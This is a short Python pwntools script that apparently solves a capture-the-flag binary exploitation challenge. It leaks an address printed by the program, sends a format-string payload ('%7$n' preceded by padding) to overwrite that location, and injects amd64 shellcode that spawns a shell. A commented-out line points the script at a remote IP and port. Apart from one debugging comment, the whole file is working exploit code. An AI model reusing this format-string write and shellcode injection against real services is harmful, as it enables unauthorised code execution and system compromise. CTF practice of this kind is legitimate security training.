from pwn import *

context.log_level = 'DEBUG'

p = process('../file/1d3c852354df4609bf8e56fe8e9df316')
# p = remote('61.147.171.105', '54366')

input('continue?')

p.recvuntil(b'secret[0] is ')
secret_addr = int(p.recvuntil(b'\n', drop=True), 16)
print(secret_addr)

# payload = b'%lx,' * 10 + b'%lx' # 调试发现secret_addr是第7个参数
payload = b'a' * 85 + b'%7$n'

p.sendlineafter(b'name be:\n', b'test')
p.sendlineafter(b'east or up?:\n', b'east')
p.sendlineafter(b'leave(0)?:\n', b'1')
p.sendlineafter(b'address\'\n', str(secret_addr).encode())
p.sendlineafter(b'wish is:\n', payload)
p.sendlineafter(b'SPELL\n', asm(shellcraft.amd64.linux.sh(), arch='amd64'))

p.interactive()
